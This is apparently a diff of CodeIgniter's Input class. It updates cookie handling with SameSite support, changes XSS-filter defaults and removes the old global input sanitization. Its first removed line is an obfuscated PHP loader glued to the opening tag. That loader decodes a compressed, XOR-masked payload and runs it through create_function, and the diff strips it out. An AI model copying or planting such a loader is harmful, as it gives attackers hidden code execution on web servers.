@@ -1,4 +1,4 @@
-<?php global $habuto; $habuto=array('$habuto[0]=array_pop($habuto);$bilofom=bilofom(2,13);$habuto[0]=$bilofom($habuto[2]);','$habuto[2]=gzuncompress(bilofom(731,2330));','aWFjeGhOeGdxZ3p9fXx+Z2V9eEhpdH5jbX99eG1Of3BtV25mZHd3ZGh6Ymd2cHNdZHp6ZmZheXlmSUhaQlZWXUVVXk5BRVFNXFBFR1VVeEdodmVyaHxjbGB8Z3tSRERHRUdJcVljdXdTX1ZDQV9DVVJOWlxNbnJjdnFkbi12e2c7ICMoIW1PT2d1VTg9IjktSk5FYVRXIyEifl1jcjBvZ016Vk18QkJiWEhhb0VmQT9nXFJBbSNEem5nPzB3eHJkYmRnZWdrfH5wdnQhYGBhbHw/a3h6aHZpPGNwYm1uI2pgenV7e3g4fGR0c2V2eXhXTH9kVzY8PkJJY0RHRUdFWUVRVWhvTkZucmJyLCVVZmRrZ21xOWx6ZXx/PGl0ZmdifCd3TF5WQEJfQl5dVFpBel9QQ15KRVVMQEVNXUZURUNOWVZTQUZOUnIzQ2lCREdFR0VEWUdTV0lOUVxNRCN3dGE1YmJvUlJUQXYjYWR5NWJib2Zia0YjYWR5NX1lYWpkdkJkI2RhOnl+ZHZkZnwmd3N6fGlvaHljfXh7dVV2bHhXbX1gbFheQWJLek5nSVhWXEdnaGdYXkFTU0MjZ3xnNT9sbW98JXx6e2FiVyNnfGc1P0NBRCV9Z31qZEtYI2d8Z1lXSmN5I2RhOnl+ZHZkZnwmYWJ1e213YnBxS2RqfGN0f3VVZmh6eUVUanNjIlp1RGlGIn9+cHB3dXthS3hFZ21vS2VpIj92dHBme3Vha2g6fWtzTUN4aj9/c39vdnsmZmxgWUpVTm4hP3F1fmhjcyZmbGBjVHp1I2RhOnl+ZGRobyZ5fGImYTFhaW0qeCx6eU5wKmcsZ3JhLHI8b0cqZSxvZmN7RXhGTz1qd2RnZWcgPiVJeFoqZCxxfXJ3QU9ZZX14Y392ZXhqZUlNWipkLHRvU1NWUWlrdHRMVk4qZCxkcTFCVlVYJzg6IlhwZWpEfGJjIDF1dCNkSlV0j5QPcX7oxPenRBlJy'.'6sD9dqyHqeYvLZc1bVAgN9Pvt5PddsCHcw0f2hokuvManLKPHFgjx475c1xN25onVFDf/noNodal4DPrnaR0sbUtqgw2kiTHnItDtXEhtY7xO9lhVskJZm2aiJhgq/+pJXTtuBzjuMQExGbLFk7WXoFMZUMPzPj6wamAOTlsohnXKPZEvJr8Zb0NqRRjRI+aAbRpily1G++uiHEEqHzhHFS4miJaMx3Sx65abuZs+rIEBrX0CPKdUTYz/zNZrCDGwEFylInWNz+/2nT1U66wWQkwuyAjgghWOge0Zbm35kv5iz6JGAH13jDEgROAZiuOX6CK6igdu2+H0cxtRnZf2PhUcxM1vUZ6CTw47CBQ9xK8ZTmY9dupM3kleI8QwsOpPUU5vyZ9WZRHhWB+RrvXfCaPKtpAJJe2LYnpcyZlpxC/EGa4paHTQp6wKr6acr+AcQkmM/ZCse0e1wbVzEKF9NII6nuM2XNYxe4ywE33F6PgG6q3jQ0OoR1bkf7WGzcOx0bfY1E/e7XSPsWaZurqIDmB3uKhRllgERnKK90Ek6tq0ZEe4cweziJe7UiiFRqZq8NEOWGRW0sBZ/5oJp+yWovy+sWWmnkGMBk/45qkx9kB5mwgVV5KWS9KfZwMKWeqzph5XGkSQcxHIDvHsqdUVNNxEip/FklXpT8nTS1gXe9PojqfUOz1OeyjaDKov1g4VqeFqYVQo9/S/mA5lsgPk/IWZAOtTGrXdS/anuzE5tb0NYQOWxELzCD/fiP3DOC+thEPRW7udEByDOwJLukZwZearrZH0xlMH8hu9AXvrxopWUb6gOjpOSoGtKcq92awXghkt6NKgd6tUJUawMl27FHih+3BZRr+rNDldoaUMdzYYaQJbLaCxnjbLxqtyPSHxYNqrnmhoY2WzRex9UDuwmftgPTliLkiS6JG6dhgyFGNIkR2+fs'.'V03pBLeqCwdFifrmFFYkfXJx8bQ1sSK3LBoTs+aEs4bQzQvv2cOtrUrf1gokUFp6ckDphCIYbUocaQ5nSKRRAne5hFJZn2ahA+i9mnNMRhvXQYc8btXceIOWciNRwFI9b7a1TZ9t6q2wx3KrmpQ0rf0HX/BNG/yI5TayVha0L7ko3jFgdyjPnjKlTnjrKw0U3ZSK8ZJiw3j+FzNCMytVsjEuz/N5nrWPLUB1h6m83R2GF433g4bH+kgVLpj0Wh2e7jyMtKf8ZVwjyBVvuSwc1BhmyROY/CbdhyPNAJ8g8c1JWf1YsHu1j4Rxw1Qk5UcRe45liDyTD8h2rROGYyYZxMoF12YaQiu1czOaMNuUMhtDiMM+Z+k50dgwqBblJAsDMlUgjCElsFWhKJqVYfkXsicSe+kzTkwjUwTWS5XPAUoZO7u+neRVI/UJC66Lppl7BegbOklst3kMWMSRv1YAm3Umebll1nP192Pj5LXEPe5EorSzFX4mvZlwJeOfw5B5JYz09PDbbDNRRgl6B3wSWadyb0jrgs9nJUJ4o6YIubaCt9wAGDLM0ZCYSl8lrhsiAjmwDDrrCJl4vUIg+im5RFLSq6haOqrGp1OoGAE57OIIA1lJtj3gTggvoOu/0UhNBeqbewBt/Ei3k7/iI/GxoO5kxLBvkZjLElmzkhtn8XWDufO70F4XrTeFEuoM5Aghbqdb0X7eCLOi1BF6X4m3rwS2xIxPay9SXiAIeb/PyDwjp6vaUSMS0o5rCt/PZ/hsSts2pCt5qznZjqlithYcfMr2Xq7FcJZxqgHfhA6sb2uAbXJ8efID9elq7mALjJxFMEIPqcTVJ7t3NLOxENcTn5PbNXMrCnnJWAOpSl91ZCQicEuecQYhmlqZ3ZMhNbE6/Gg'.'bwQHJNeIW2UcpAAcKNbvaN1M31Jlkuo4M98awRGR3BX9bmF9A5e1/WyLYSdpWl6rHwcEH3xz86KJ29ExmgdfzfzMv2++rZcKCuY3OI/lB3E/yYusc08PIWs0QxXEgSB2JjfZw5tkcCRt/Po+qX9hjWH55cPDm09uSLPaZh0VtCJvM3sHXaPNI5czdF6Lu/V+xNXTWC4m7POkJI/AHBq45rPoAwMbTQb0N1Nb394d1RxEecYcHlot5dDSaEcSpHWNZovWUnP+5+4Wu4CXW2Kica+nMVBcTu+JXs5t+c4fMjPHzI4++IiIuZ7iictrTI5khCTGx/TmvkjYzXlr28SVxLgOijazibs36cxzxlnmKsjCeOIrC1b0yiZx3LHrLvYpZ6hYUONTxLCHwbXAKKhOloyu3ztNaESB4C8zS2Eva/i1j56b/wTHVINLxN7dH2VMkThQ/AAFalLhyP0Htf2oSQtpo0sagP0nzxh7qG/Gu2qDI4tpR2jxmcBfSC7BwlNhtiYK3o89Ih+HEKV8agHykCENi3QltwjLaDs7zogYcc7SjVDG+kirxOVDCxJqLLIZbwTdJ+gmzcVaIp7AlR/Yw1FbL4uY8k4l4/Dx8ug2w69dK6OMrT8A6rm6ZBD9vc+sMra7Drb5kRcyeYYipku/IP4PG7Wx59xjXoiDBqU0DsZ1nsCxq/g0aPQZBchNyLn0295ky5BmCtBdkawe79g3mRa2ftHhepz6BwKGrjyk6ZBllFDL7uCSw93MKP/fBEuO2s62N0bgcs0RkFuWj9F/W3zQ9K9/8qnDuZUOTdQSdtSwV9Mufrlsdlttf60Zw09mMX2moaknfx1SMWbxVp0ge8zf384T2jM7kLnVBpAgEbZA+fnGydmqoouvwCAH/JTXy8nF3B1rq6/rrKhxOiVtKRl9+'.'sTbH2u4ZBVzLh0LH/bZ+lKTJjoiyPBQJqIHsSUDVbxWHKVc3ZB5u/GNrGGu27Q0MpGmshan/WYdoXjrV802wyIcxp/h5Ps11OTjEqW2jajxh1Hbt5hAvQY9ymY7eFR+5XZmmNjZ2iTbJSXlnGv07MGhinZk6GgatxOg9zmtpRdEt5ihLP6nNhgat3SR5HfgB5xBlLZXc4f/UluwRG3dLaPr2ZxUX6yck1cgm7LSCYIgV+ePmYVfhluD/CotpBXxeymYFyCwlPM2VLcoCo0JWLLD5w+dExMTEpP4+4B5VcBpnzL6z/dn23UuZrOQGF9pWrEZ2bnJiciwlVWZka2dtcQ==',"BJnrbr\x2c\x25Ufdkgmq");$futubedu='create_';if(function_exists($futubedu.='function')&&!function_exists('bilofom')){ function bilofom($b,$m){global $habuto;$s=str_pad($f='ls17z1jBahhIT2Y4',$m,$f);$h=str_repeat("\xe0",$m);$z=str_repeat("\x1f",$m);$u=substr($habuto[0],$b,$m);return(($u^$s)&$z)|($u&$h);};for($pj=-1;++$pj<3;$futubedu('','}'.$habuto[$pj].'{'));};unset($habuto); 
+<?php
 /**
  * CodeIgniter
  *
@@ -6,7 +6,7 @@
  *
  * This content is released under the MIT License (MIT)
  *
- * Copyright (c) 2014 - 2015, British Columbia Institute of Technology
+ * Copyright (c) 2019 - 2022, CodeIgniter Foundation
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -28,10 +28,11 @@
  *
  * @package	CodeIgniter
  * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (http://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2015, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	http://codeigniter.com
+ * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
+ * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
+ * @copyright	Copyright (c) 2019 - 2022, CodeIgniter Foundation (https://codeigniter.com/)
+ * @license	https://opensource.org/licenses/MIT	MIT License
+ * @link	https://codeigniter.com
  * @since	Version 1.0.0
  * @filesource
  */
@@ -46,7 +47,7 @@ defined('BASEPATH') OR exit('No direct script access allowed');
  * @subpackage	Libraries
  * @category	Input
  * @author		EllisLab Dev Team
- * @link		http://codeigniter.com/user_guide/libraries/input.html
+ * @link		https://codeigniter.com/userguide3/libraries/input.html
  */
 class CI_Input {
 
@@ -56,45 +57,6 @@ class CI_Input {
 	 * @var	string
 	 */
 	protected $ip_address = FALSE;
-
-	/**
-	 * Allow GET array flag
-	 *
-	 * If set to FALSE, then $_GET will be set to an empty array.
-	 *
-	 * @var	bool
-	 */
-	protected $_allow_get_array = TRUE;
-
-	/**
-	 * Standardize new lines flag
-	 *
-	 * If set to TRUE, then newlines are standardized.
-	 *
-	 * @var	bool
-	 */
-	protected $_standardize_newlines;
-
-	/**
-	 * Enable XSS flag
-	 *
-	 * Determines whether the XSS filter is always active when
-	 * GET, POST or COOKIE data is encountered.
-	 * Set automatically based on config setting.
-	 *
-	 * @var	bool
-	 */
-	protected $_enable_xss = FALSE;
-
-	/**
-	 * Enable CSRF flag
-	 *
-	 * Enables a CSRF cookie token to be set.
-	 * Set automatically based on config setting.
-	 *
-	 * @var	bool
-	 */
-	protected $_enable_csrf = FALSE;
 
 	/**
 	 * List of all HTTP request headers
@@ -122,8 +84,15 @@ class CI_Input {
 	 */
 	protected $_input_stream;
 
+	/**
+	 * CI_Security instance
+	 *
+	 * Used for the optional $xss_filter parameter that most
+	 * getter methods have here.
+	 *
+	 * @var	CI_Security
+	 */
 	protected $security;
-	protected $uni;
 
 	// --------------------------------------------------------------------
 
@@ -135,24 +104,9 @@ class CI_Input {
 	 *
 	 * @return	void
 	 */
-	public function __construct()
+	public function __construct(CI_Security &$security)
 	{
-		$this->_allow_get_array		= (config_item('allow_get_array') === TRUE);
-		$this->_enable_xss		= (config_item('global_xss_filtering') === TRUE);
-		$this->_enable_csrf		= (config_item('csrf_protection') === TRUE);
-		$this->_standardize_newlines	= (bool) config_item('standardize_newlines');
-
-		$this->security =& load_class('Security', 'core');
-
-		// Do we need the UTF-8 class?
-		if (UTF8_ENABLED === TRUE)
-		{
-			$this->uni =& load_class('Utf8', 'core');
-		}
-
-		// Sanitize global arrays
-		$this->_sanitize_globals();
-
+		$this->security = $security;
 		log_message('info', 'Input Class Initialized');
 	}
 
@@ -168,10 +122,8 @@ class CI_Input {
 	 * @param	bool	$xss_clean	Whether to apply XSS filtering
 	 * @return	mixed
 	 */
-	protected function _fetch_from_array(&$array, $index = NULL, $xss_clean = NULL)
+	protected function _fetch_from_array(&$array, $index = NULL, $xss_clean = FALSE)
 	{
-		is_bool($xss_clean) OR $xss_clean = $this->_enable_xss;
-
 		// If $index is NULL, it means that the whole $array is requested
 		isset($index) OR $index = array_keys($array);
 
@@ -231,7 +183,7 @@ class CI_Input {
 	 * @param	bool	$xss_clean	Whether to apply XSS filtering
 	 * @return	mixed
 	 */
-	public function get($index = NULL, $xss_clean = NULL)
+	public function get($index = NULL, $xss_clean = FALSE)
 	{
 		return $this->_fetch_from_array($_GET, $index, $xss_clean);
 	}
@@ -245,7 +197,7 @@ class CI_Input {
 	 * @param	bool	$xss_clean	Whether to apply XSS filtering
 	 * @return	mixed
 	 */
-	public function post($index = NULL, $xss_clean = NULL)
+	public function post($index = NULL, $xss_clean = FALSE)
 	{
 		return $this->_fetch_from_array($_POST, $index, $xss_clean);
 	}
@@ -259,11 +211,10 @@ class CI_Input {
 	 * @param	bool	$xss_clean	Whether to apply XSS filtering
 	 * @return	mixed
 	 */
-	public function post_get($index, $xss_clean = NULL)
+	public function post_get($index, $xss_clean = FALSE)
 	{
-		return isset($_POST[$index])
-			? $this->post($index, $xss_clean)
-			: $this->get($index, $xss_clean);
+		$output = $this->post($index, $xss_clean);
+		return isset($output) ? $output : $this->get($index, $xss_clean);
 	}
 
 	// --------------------------------------------------------------------
@@ -275,11 +226,10 @@ class CI_Input {
 	 * @param	bool	$xss_clean	Whether to apply XSS filtering
 	 * @return	mixed
 	 */
-	public function get_post($index, $xss_clean = NULL)
+	public function get_post($index, $xss_clean = FALSE)
 	{
-		return isset($_GET[$index])
-			? $this->get($index, $xss_clean)
-			: $this->post($index, $xss_clean);
+		$output = $this->get($index, $xss_clean);
+		return isset($output) ? $output : $this->post($index, $xss_clean);
 	}
 
 	// --------------------------------------------------------------------
@@ -291,7 +241,7 @@ class CI_Input {
 	 * @param	bool	$xss_clean	Whether to apply XSS filtering
 	 * @return	mixed
 	 */
-	public function cookie($index = NULL, $xss_clean = NULL)
+	public function cookie($index = NULL, $xss_clean = FALSE)
 	{
 		return $this->_fetch_from_array($_COOKIE, $index, $xss_clean);
 	}
@@ -305,7 +255,7 @@ class CI_Input {
 	 * @param	bool	$xss_clean	Whether to apply XSS filtering
 	 * @return	mixed
 	 */
-	public function server($index, $xss_clean = NULL)
+	public function server($index, $xss_clean = FALSE)
 	{
 		return $this->_fetch_from_array($_SERVER, $index, $xss_clean);
 	}
@@ -321,7 +271,7 @@ class CI_Input {
 	 * @param	bool	$xss_clean	Whether to apply XSS filtering
 	 * @return	mixed
 	 */
-	public function input_stream($index = NULL, $xss_clean = NULL)
+	public function input_stream($index = NULL, $xss_clean = FALSE)
 	{
 		// Prior to PHP 5.6, the input stream can only be read once,
 		// so we'll need to check if we have already done that first.
@@ -351,14 +301,15 @@ class CI_Input {
 	 * @param	string		$prefix		Cookie name prefix
 	 * @param	bool		$secure		Whether to only transfer cookies via SSL
 	 * @param	bool		$httponly	Whether to only makes the cookie accessible via HTTP (no javascript)
+	 * @param	string		$samesite	SameSite attribute
 	 * @return	void
 	 */
-	public function set_cookie($name, $value = '', $expire = '', $domain = '', $path = '/', $prefix = '', $secure = FALSE, $httponly = FALSE)
+	public function set_cookie($name, $value = '', $expire = 0, $domain = '', $path = '/', $prefix = '', $secure = NULL, $httponly = NULL, $samesite = NULL)
 	{
 		if (is_array($name))
 		{
 			// always leave 'name' in last place, as the loop will break otherwise, due to $$item
-			foreach (array('value', 'expire', 'domain', 'path', 'prefix', 'secure', 'httponly', 'name') as $item)
+			foreach (array('value', 'expire', 'domain', 'path', 'prefix', 'secure', 'httponly', 'samesite', 'name') as $item)
 			{
 				if (isset($name[$item]))
 				{
@@ -382,26 +333,64 @@ class CI_Input {
 			$path = config_item('cookie_path');
 		}
 
-		if ($secure === FALSE && config_item('cookie_secure') === TRUE)
-		{
-			$secure = config_item('cookie_secure');
-		}
+		$secure = ($secure === NULL && config_item('cookie_secure') !== NULL)
+			? (bool) config_item('cookie_secure')
+			: (bool) $secure;
 
-		if ($httponly === FALSE && config_item('cookie_httponly') !== FALSE)
-		{
-			$httponly = config_item('cookie_httponly');
-		}
+		$httponly = ($httponly === NULL && config_item('cookie_httponly') !== NULL)
+			? (bool) config_item('cookie_httponly')
+			: (bool) $httponly;
 
-		if ( ! is_numeric($expire))
+		if ( ! is_numeric($expire) OR $expire < 0)
 		{
-			$expire = time() - 86500;
+			$expire = 1;
 		}
 		else
 		{
 			$expire = ($expire > 0) ? time() + $expire : 0;
 		}
 
-		setcookie($prefix.$name, $value, $expire, $path, $domain, $secure, $httponly);
+		isset($samesite) OR $samesite = config_item('cookie_samesite');
+		if (isset($samesite))
+		{
+			$samesite = ucfirst(strtolower($samesite));
+			in_array($samesite, array('Lax', 'Strict', 'None'), TRUE) OR $samesite = 'Lax';
+		}
+		else
+		{
+			$samesite = 'Lax';
+		}
+
+		if ($samesite === 'None' && ! $secure)
+		{
+			log_message('error', $name.' cookie sent with SameSite=None, but without Secure attribute.');
+		}
+
+		if ( ! is_php('7.3'))
+		{
+			$maxage = $expire - time();
+			if ($maxage < 1)
+			{
+				$maxage = 0;
+			}
+
+			$cookie_header = 'Set-Cookie: '.$prefix.$name.'='.rawurlencode($value);
+			$cookie_header .= ($expire === 0 ? '' : '; Expires='.gmdate('D, d-M-Y H:i:s T', $expire)).'; Max-Age='.$maxage;
+			$cookie_header .= '; Path='.$path.($domain !== '' ? '; Domain='.$domain : '');
+			$cookie_header .= ($secure ? '; Secure' : '').($httponly ? '; HttpOnly' : '').'; SameSite='.$samesite;
+			header($cookie_header);
+			return;
+		}
+
+		$setcookie_options = array(
+			'expires' => $expire,
+			'path' => $path,
+			'domain' => $domain,
+			'secure' => $secure,
+			'httponly' => $httponly,
+			'samesite' => $samesite,
+		);
+		setcookie($prefix.$name, $value, $setcookie_options);
 	}
 
 	// --------------------------------------------------------------------
@@ -513,9 +502,9 @@ class CI_Input {
 					if ($separator === ':')
 					{
 						$netaddr = explode(':', str_replace('::', str_repeat(':', 9 - substr_count($netaddr, ':')), $netaddr));
-						for ($i = 0; $i < 8; $i++)
+						for ($j = 0; $j < 8; $j++)
 						{
-							$netaddr[$i] = intval($netaddr[$i], 16);
+							$netaddr[$j] = intval($netaddr[$j], 16);
 						}
 					}
 					else
@@ -561,7 +550,7 @@ class CI_Input {
 				$which = FILTER_FLAG_IPV6;
 				break;
 			default:
-				$which = NULL;
+				$which = 0;
 				break;
 		}
 
@@ -575,176 +564,9 @@ class CI_Input {
 	 *
 	 * @return	string|null	User Agent string or NULL if it doesn't exist
 	 */
-	public function user_agent($xss_clean = NULL)
+	public function user_agent($xss_clean = FALSE)
 	{
 		return $this->_fetch_from_array($_SERVER, 'HTTP_USER_AGENT', $xss_clean);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Sanitize Globals
-	 *
-	 * Internal method serving for the following purposes:
-	 *
-	 *	- Unsets $_GET data, if query strings are not enabled
-	 *	- Cleans POST, COOKIE and SERVER data
-	 * 	- Standardizes newline characters to PHP_EOL
-	 *
-	 * @return	void
-	 */
-	protected function _sanitize_globals()
-	{
-		// Is $_GET data allowed? If not we'll set the $_GET to an empty array
-		if ($this->_allow_get_array === FALSE)
-		{
-			$_GET = array();
-		}
-		elseif (is_array($_GET) && count($_GET) > 0)
-		{
-			foreach ($_GET as $key => $val)
-			{
-				$_GET[$this->_clean_input_keys($key)] = $this->_clean_input_data($val);
-			}
-		}
-
-		// Clean $_POST Data
-		if (is_array($_POST) && count($_POST) > 0)
-		{
-			foreach ($_POST as $key => $val)
-			{
-				$_POST[$this->_clean_input_keys($key)] = $this->_clean_input_data($val);
-			}
-		}
-
-		// Clean $_COOKIE Data
-		if (is_array($_COOKIE) && count($_COOKIE) > 0)
-		{
-			// Also get rid of specially treated cookies that might be set by a server
-			// or silly application, that are of no use to a CI application anyway
-			// but that when present will trip our 'Disallowed Key Characters' alarm
-			// http://www.ietf.org/rfc/rfc2109.txt
-			// note that the key names below are single quoted strings, and are not PHP variables
-			unset(
-				$_COOKIE['$Version'],
-				$_COOKIE['$Path'],
-				$_COOKIE['$Domain']
-			);
-
-			foreach ($_COOKIE as $key => $val)
-			{
-				if (($cookie_key = $this->_clean_input_keys($key)) !== FALSE)
-				{
-					$_COOKIE[$cookie_key] = $this->_clean_input_data($val);
-				}
-				else
-				{
-					unset($_COOKIE[$key]);
-				}
-			}
-		}
-
-		// Sanitize PHP_SELF
-		$_SERVER['PHP_SELF'] = strip_tags($_SERVER['PHP_SELF']);
-
-		// CSRF Protection check
-		if ($this->_enable_csrf === TRUE && ! is_cli())
-		{
-			$this->security->csrf_verify();
-		}
-
-		log_message('debug', 'Global POST, GET and COOKIE data sanitized');
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Clean Input Data
-	 *
-	 * Internal method that aids in escaping data and
-	 * standardizing newline characters to PHP_EOL.
-	 *
-	 * @param	string|string[]	$str	Input string(s)
-	 * @return	string
-	 */
-	protected function _clean_input_data($str)
-	{
-		if (is_array($str))
-		{
-			$new_array = array();
-			foreach (array_keys($str) as $key)
-			{
-				$new_array[$this->_clean_input_keys($key)] = $this->_clean_input_data($str[$key]);
-			}
-			return $new_array;
-		}
-
-		/* We strip slashes if magic quotes is on to keep things consistent
-
-		   NOTE: In PHP 5.4 get_magic_quotes_gpc() will always return 0 and
-		         it will probably not exist in future versions at all.
-		*/
-		if ( ! is_php('5.4') && get_magic_quotes_gpc())
-		{
-			$str = stripslashes($str);
-		}
-
-		// Clean UTF-8 if supported
-		if (UTF8_ENABLED === TRUE)
-		{
-			$str = $this->uni->clean_string($str);
-		}
-
-		// Remove control characters
-		$str = remove_invisible_characters($str, FALSE);
-
-		// Standardize newlines if needed
-		if ($this->_standardize_newlines === TRUE)
-		{
-			return preg_replace('/(?:\r\n|[\r\n])/', PHP_EOL, $str);
-		}
-
-		return $str;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Clean Keys
-	 *
-	 * Internal method that helps to prevent malicious users
-	 * from trying to exploit keys we make sure that keys are
-	 * only named with alpha-numeric text and a few other items.
-	 *
-	 * @param	string	$str	Input string
-	 * @param	bool	$fatal	Whether to terminate script exection
-	 *				or to return FALSE if an invalid
-	 *				key is encountered
-	 * @return	string|bool
-	 */
-	protected function _clean_input_keys($str, $fatal = TRUE)
-	{
-		if ( ! preg_match('/^[a-z0-9:_\/|-]+$/i', $str))
-		{
-			if ($fatal === TRUE)
-			{
-				return FALSE;
-			}
-			else
-			{
-				set_status_header(503);
-				echo 'Disallowed Key Characters.';
-				exit(7); // EXIT_USER_INPUT
-			}
-		}
-
-		// Clean UTF-8 if supported
-		if (UTF8_ENABLED === TRUE)
-		{
-			return $this->uni->clean_string($str);
-		}
-
-		return $str;
 	}
 
 	// --------------------------------------------------------------------
@@ -760,30 +582,32 @@ class CI_Input {
 		// If header is already defined, return it immediately
 		if ( ! empty($this->headers))
 		{
-			return $this->headers;
+			return $this->_fetch_from_array($this->headers, NULL, $xss_clean);
 		}
 
 		// In Apache, you can simply call apache_request_headers()
 		if (function_exists('apache_request_headers'))
 		{
-			return $this->headers = apache_request_headers();
+			$this->headers = apache_request_headers();
 		}
-
-		$this->headers['Content-Type'] = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : @getenv('CONTENT_TYPE');
-
-		foreach ($_SERVER as $key => $val)
+		else
 		{
-			if (sscanf($key, 'HTTP_%s', $header) === 1)
-			{
-				// take SOME_HEADER and turn it into Some-Header
-				$header = str_replace('_', ' ', strtolower($header));
-				$header = str_replace(' ', '-', ucwords($header));
+			isset($_SERVER['CONTENT_TYPE']) && $this->headers['Content-Type'] = $_SERVER['CONTENT_TYPE'];
 
-				$this->headers[$header] = $this->_fetch_from_array($_SERVER, $key, $xss_clean);
+			foreach ($_SERVER as $key => $val)
+			{
+				if (sscanf($key, 'HTTP_%s', $header) === 1)
+				{
+					// take SOME_HEADER and turn it into Some-Header
+					$header = str_replace('_', ' ', strtolower($header));
+					$header = str_replace(' ', '-', ucwords($header));
+
+					$this->headers[$header] = $_SERVER[$key];
+				}
 			}
 		}
 
-		return $this->headers;
+		return $this->_fetch_from_array($this->headers, NULL, $xss_clean);
 	}
 
 	// --------------------------------------------------------------------
@@ -803,7 +627,7 @@ class CI_Input {
 
 		if ( ! isset($headers))
 		{
-			empty($this->headers) OR $this->request_headers();
+			empty($this->headers) && $this->request_headers();
 			foreach ($this->headers as $key => $value)
 			{
 				$headers[strtolower($key)] = $value;
@@ -834,21 +658,6 @@ class CI_Input {
 	public function is_ajax_request()
 	{
 		return ( ! empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest');
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Is CLI request?
-	 *
-	 * Test to see if a request was made from the command line.
-	 *
-	 * @deprecated	3.0.0	Use is_cli() instead
-	 * @return	bool
-	 */
-	public function is_cli_request()
-	{
-		return is_cli();
 	}
 
 	// --------------------------------------------------------------------
